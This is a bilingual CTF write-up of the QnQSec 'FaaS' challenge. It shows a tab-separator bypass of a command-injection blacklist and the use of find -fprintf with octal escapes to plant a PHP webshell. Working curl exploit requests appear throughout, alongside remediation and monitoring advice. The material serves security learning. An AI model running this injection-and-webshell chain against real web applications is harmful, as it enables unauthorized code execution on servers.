# QnQSec CTF 2025 — FaaS

## Metadata

- Challenge: FaaS
- Author: Whale120
- Category: Web / Command Injection / RCE (sandboxed)
- Difficulty: Medium
- Solver: lilsadfoqs
- Analyst: Aurelinth
- Target: `http://161.97.155.116:8888/`
- Date: 2025-10-17

---

## Executive summary

The challenge exposes a PHP endpoint that runs `find` with user-controlled arguments. The application attempted to block classical command injection characters, but only filtered **spaces** and a list of punctuation—leaving **tab** (`\t`) usable as an argument separator. By combining argument-splitting via tabs with `find`’s `-fprintf` functionality and using octal escapes to encode bytes, we wrote a PHP file into the webroot that executed `/readflag` with its required argument. This yielded the flag: `QnQSec{big_thanks_2_🍊_4876three}`.

---

## Scope & preconditions

- In-scope: HTTP endpoint `/?cmd=...` served by `index.php` which calls `system("find " . $cmd)`.
- No credentials required.
- Organizers confirmed this is a lab/CTF environment; all actions were permitted.

---

## Recon / initial observations

- Visiting the app without `cmd` printed the `index.php` source. `index.php` obtains `$_GET['cmd']`, rejects requests containing many special characters and **spaces**, then runs `system("find " . $cmd)`.
- Key blacklist (checked via `strpos`): `; | $`   `& \n > < ( ) space \r + { } [ ]` — notably **tab** (`\t`) and single quotes (`'`) are **not** blocked.
- Early experiment: sending `/` plus tabs and `maxdepth 1 -ls` yielded the server response equivalent to `find / -maxdepth 1 -ls` (tab acted as argument separator). This demonstrated argument splitting without a space.
- `/readflag` was present at `/readflag` and had `-x--x--x` permissions (executable for others). However `find -exec` style usage requires `;` or `+`, both blacklisted.
- Found `/var/www/html` writable by `www-data`, and `find -fprintf` / `printf` can write data to arbitrary paths.

Quick commands used for reconnaissance

```bash
# Confirm tab-as-separator works
curl 'http://161.97.155.116:8888/?cmd=/%09-maxdepth%091%09-ls'

# Check /readflag exists in top-level
curl 'http://161.97.155.116:8888/?cmd=/%09-maxdepth%091%091%09-type%09f%09-name%09readflag%09-ls'

# List writable webroot
curl 'http://161.97.155.116:8888/?cmd=/var/www/html%09-maxdepth%091%09-writable%09-ls'

# List SUID (for reconnaissance)
curl 'http://161.97.155.116:8888/?cmd=/%09-type%09f%09-perm%09%2F4000%09-maxdepth%09100%09-ls'

```

---

## Vulnerability 1 — Argument splitting via unfiltered tab (Severity: High)

**Description:** `index.php` concatenates user input directly into a shell command passed to `system()`. The application blacklists space and a set of characters, but **does not block tab (`\t`)**, which the shell treats as whitespace. This allows providing multiple arguments to `find` without using a space character.

**Root cause:** unsafe concatenation into `system()` and an incomplete blacklist that assumes only space separates arguments.

**Reproduction / PoC:**

A request with `%09` (URL-encoded tab) splits arguments:

```
GET /?cmd=/%09-maxdepth%091%09-ls

```

This is executed as:

```
find / -maxdepth 1 -ls

```

**Impact:** ability to supply arbitrary `find` options (e.g. `-printf`, `-fprintf`) that can alter file contents on the filesystem — leading to code injection if webroot is writable.

---

## Vulnerability 2 — Unsafe use of `find` options to write files (Severity: High)

**Description:** `find` features like `-fprintf`/`-printf` can write arbitrary bytes to a target file. When passed format strings that contain escape sequences (`\ooo`), `find` expands them to bytes. Because the webroot was writable by the web user, `find -fprintf` can be used to create server-side executable code.

**Root cause:** executing `find` with user-supplied arguments over a web-exposed filesystem that is writable by the web server. No sanitization prevents use of `-fprintf` with format escapes.

**Reproduction / PoC:** use `-fprintf` with an octal-escaped format string. Care must be taken to preserve backslashes through the shell; passing the format inside single quotes prevents the shell from stripping backslashes before `find` sees them.

---

## Exploitation — full chain (step-by-step)

### What we wanted / constraints

- Cannot use `;`, `|`, `$`, `(`, `)`, `+` or space in the `cmd` parameter — these are blacklisted by PHP.
- Tab `%09` can be used as an argument separator.
- `/readflag` required the exact parameter: `i want the flag please`.

### Steps

1. **Confirm webroot writable**
    
    ```bash
    curl 'http://161.97.155.116:8888/?cmd=/var/www/html%09-maxdepth%091%09-writable%09-ls'
    
    ```
    
    Output showed `/var/www/html` owned by `www-data` and writable.
    
2. **Craft a small PHP webshell to execute arbitrary commands**
    
    The final shell used `echo \`/readflag i want the flag please``within PHP, because using backticks avoids introducing`$`or`[ ``]`or parentheses in the web-facing request. The shell content we wanted in`/var/www/html/p.php`:
    
    ```php
    <?php echo `/readflag i want the flag please`; ?>
    
    ```
    
3. **Write the PHP file using `find -fprintf` with octal escapes and single quotes**
    
    We must ensure the octal backslashes reach `find` intact, so we wrap the format argument in single quotes (single quotes are not blacklisted). Below is the exact request used to write the webshell file (note tabs `%09` between `find` arguments):
    
    ```bash
    curl 'http://161.97.155.116:8888/?cmd=/%09-maxdepth%090%09-fprintf%09/var/www/html/p.php%09%27%5C074%5C077php%5C040echo%5C040%5C140/readflag%5C040i%5C040want%5C040the%5C040flag%5C040please%5C140%5C073%5C040%5C077%5C076%27'
    
    ```
    
    Breakdown:
    
    - `%09` are tabs (argument separators).
    - The final argument is a single-quoted string containing octal escapes (e.g. `\074` → `<`, `\040` → space, `\140` → backtick, etc.). The single quotes ensure the shell does not consume the backslashes before `find` sees them.
4. **Invoke the webshell to run `/readflag` with its exact argument**
    
    After the file was written, requesting:
    
    ```
    http://161.97.155.116:8888/p.php
    
    ```
    
    executed the backticked command inside the PHP, running:
    
    ```
    /readflag i want the flag please
    
    ```
    
    and returned the flag in the HTTP response.
    

### Final — exact output (flag)

`QnQSec{big_thanks_2_🍊_4876three}`

---

## Artifacts

- Flags: `QnQSec{big_thanks_2_🍊_4876three}`
- Files produced:
    - `/var/www/html/p.php` — the injected PHP file containing: `<?php echo` /readflag i want the flag please`; ?>` (written via `find -fprintf` + octal escapes)
- Key commands (PoC):
    - Recon / tab-splitting:
        
        ```bash
        curl 'http://161.97.155.116:8888/?cmd=/%09-maxdepth%091%09-ls'
        
        ```
        
    - Write webshell (single request):
        
        ```bash
        curl 'http://161.97.155.116:8888/?cmd=/%09-maxdepth%090%09-fprintf%09/var/www/html/p.php%09%27%5C074%5C077php%5C040echo%5C040%5C140/readflag%5C040i%5C040want%5C040the%5C040flag%5C040please%5C140%5C073%5C040%5C077%5C076%27'
        
        ```
        
    - Retrieve flag:
        
        ```
        http://161.97.155.116:8888/p.php
        
        ```
        

---

## Remediation recommendations

Short-term (priority)

1. **Never concatenate user input into shell commands.** Use safe process execution primitives (e.g., `proc_open`, `execve` variants, or language-specific functions that accept an argv array) or better, avoid shelling out altogether.
2. **Whitelist acceptable inputs rather than blacklist characters.** If allowing only paths, validate using a strict regex (e.g., `^/[A-Za-z0-9/_-]+$`) and explicitly reject any sequences containing control characters or escape sequences.
3. **Remove direct file-writing capabilities from commands invoked with user input.** Do not allow `find` to accept arbitrary format strings or arguments coming from the web.

Long-term / defense-in-depth

1. Serve dynamic content with minimal privileges and restrict writable paths. Web server document roots should not be generally writable by the web process. Move webroot ownership to a separate deployment process or CI.
2. Harden PHP and webserver config: disable execution of uploaded files in directories writable by web processes; enable `open_basedir` restrictions; run PHP-FPM pools with reduced privileges and separate users per vhost if applicable.
3. Audit uses of shelling commands in codebase; add code reviews and automated scanners to detect unsafe concatenation into `system()`/`exec()`/backticks.

Monitoring / detection suggestions

- Alert on use of `find` with suspicious options like `printf`/`fprintf` originating from webserver processes.
- Watch for creation of new files under webroot by the webserver user.
- Log and review `system()` invocations or use of process creation APIs in web applications.

---

## Timeline & disclosure

- 2025-10-17 — vulnerability discovered during CTF challenge solving (by lilsadfoqs; analysis by Aurelinth).
- No real-world systems impacted; this was a CTF lab challenge. Disclosure to challenge author not required in contest context.

---

## Appendix

### Full PoC script (one-liners shown above)

1. Confirm tab-splitting:

```bash
curl 'http://161.97.155.116:8888/?cmd=/%09-maxdepth%091%09-ls'

```

1. Write PHP file (single HTTP request):

```bash
curl 'http://161.97.155.116:8888/?cmd=/%09-maxdepth%090%09-fprintf%09/var/www/html/p.php%09%27%5C074%5C077php%5C040echo%5C040%5C140/readflag%5C040i%5C040want%5C040the%5C040flag%5C040please%5C140%5C073%5C040%5C077%5C076%27'

```

1. Retrieve flag:

```
http://161.97.155.116:8888/p.php

```

---

# Phiên bản tiếng Việt

## Thông tin chung

- Challenge: FaaS
- Tác giả: Whale120
- Loại: Web / Command Injection / RCE (sandboxed)
- Độ khó: Trung bình
- Người giải: lilsadfoqs
- Phân tích: Aurelinth
- Mục tiêu: `http://161.97.155.116:8888/`
- Ngày: 2025-10-17

---

## Tóm tắt ngắn

Endpoint PHP thực thi `find` với tham số do người dùng cung cấp. Ứng dụng chặn một số ký tự đặc biệt và **space**, nhưng **không chặn tab**; dùng tab làm bộ tách argument cho phép truyền các option `find` (ví dụ `-fprintf`). Bằng cách dùng `-fprintf` với escape bát phân (octal) và đặt format trong nháy đơn để giữ backslash, chúng tôi tạo một file PHP trong webroot và thực thi `/readflag` với tham số đúng, thu được flag: `QnQSec{big_thanks_2_🍊_4876three}`.

---

## Phạm vi & điều kiện tiền đề

- Trong phạm vi: route `/?cmd=...` của `index.php` (chạy `system("find " . $cmd)`)
- Không cần credentials.
- Là môi trường CTF, các hành động được phép trong phạm vi challenge.

---

## Recon / quan sát ban đầu

- `index.php` lấy `$_GET['cmd']`, kiểm tra blacklist nhiều ký tự (bao gồm space) rồi gọi `system("find " . $cmd)`.
- Thử nghiệm cho thấy `%09` (tab) vẫn hoạt động như khoảng trắng → có thể truyền nhiều argument vào `find`.
- `/readflag` tồn tại và executable; `find -exec` yêu cầu ký tự `;` hoặc `+` nhưng chúng bị blacklist.
- `/var/www/html` writable bởi `www-data`, cho phép viết file web.

Lệnh reconnaissance đã dùng:

```bash
curl 'http://161.97.155.116:8888/?cmd=/%09-maxdepth%091%09-ls'
curl 'http://161.97.155.116:8888/?cmd=/var/www/html%09-maxdepth%091%09-writable%09-ls'
curl 'http://161.97.155.116:8888/?cmd=/%09-type%09f%09-perm%09%2F4000%09-maxdepth%09100%09-ls'

```

---

## Lỗ hổng 1 — Tab argument splitting (Mức độ: Cao)

**Mô tả:** input được nối vào shell và chạy, nhưng blacklist không chặn tab; shell coi tab là whitespace → có thể truyền nhiều arguments cho `find`.

**Nguyên nhân gốc rễ:** unsafe concatenation tới `system()` và blacklist không toàn diện.

**PoC:** `/?cmd=/%09-maxdepth%091%09-ls` tương đương `find / -maxdepth 1 -ls`.

**Tác hại:** cho phép truyền option `find` nguy hiểm (ví dụ `-fprintf`) vào hệ thống.

---

## Lỗ hổng 2 — Dùng `find -fprintf` để ghi file (Mức độ: Cao)

**Mô tả:** `-fprintf` có thể ghi byte tùy ý khi định dạng chứa escape bát phân (`\ooo`). Vì webroot có thể ghi, có thể tạo file PHP.

**Nguyên nhân gốc rễ:** cho phép `find` nhận tham số do user kiểm soát, filesystem web có quyền ghi.

**PoC:** dùng `-fprintf` với format chứa `\074` `\040` ... và đặt trong nháy đơn để giữ backslash.

---

## Chain exploit — chi tiết từng bước

1. Xác nhận webroot writable.
2. Tạo PHP file `/var/www/html/p.php` có nội dung:
    
    ```php
    <?php echo `/readflag i want the flag please`; ?>
    
    ```
    
    bằng `find -fprintf` với format octal escapes (đặt trong single quotes).
    
3. Truy cập `http://.../p.php` để thực thi và thu flag.

Các lệnh chính:

```bash
# Viết webshell (ghi file bằng octal escapes, format ở trong single quotes)
curl 'http://161.97.155.116:8888/?cmd=/%09-maxdepth%090%09-fprintf%09/var/www/html/p.php%09%27%5C074%5C077php%5C040echo%5C040%5C140/readflag%5C040i%5C040want%5C040the%5C040flag%5C040please%5C140%5C073%5C040%5C077%5C076%27'

# Lấy flag
http://161.97.155.116:8888/p.php

```

Kết quả:

```
QnQSec{big_thanks_2_🍊_4876three}

```

---

## Bằng chứng & artifacts

- Flag: `QnQSec{big_thanks_2_🍊_4876three}`
- File: `/var/www/html/p.php` (được tạo bằng `find -fprintf`)
- PoC HTTP requests: đã liệt kê phía trên.

---

## Khuyến nghị sửa chữa

**Fix nhanh (priority)**

1. Không dùng `system("...".$input)` với input thô. Dùng API cho exec với argv array hoặc hạn chế hoàn toàn shell execution.
2. Whitelist input thay vì blacklist; nghiêm ngặt cho đường dẫn (ví dụ chỉ cho phép ký tự `/[A-Za-z0-9._-]+`).
3. Ngăn chặn `find` được cấp tham số trực tiếp bởi người dùng; nếu cần tìm file, cung cấp giao diện API an toàn.

**Fix lâu dài**

1. Đặt webroot không writable bởi user web (deployment process khác để deploy code).
2. Hardening PHP/Apache (open_basedir, disabled functions), chạy PHP-FPM với user tách biệt.
3. Audit source code tìm mọi chỗ gọi shell.

**Monitoring**

- Cảnh báo cho `find` với `fprintf`/`printf` từ process web.
- Giám sát tạo file mới trong webroot bởi user web.

---

## Timeline & disclosure

- 2025-10-17 — Phát hiện và exploit trong khuôn khổ CTF.
- Đây là môi trường thi; không ảnh hưởng hệ thống thực tế.

---
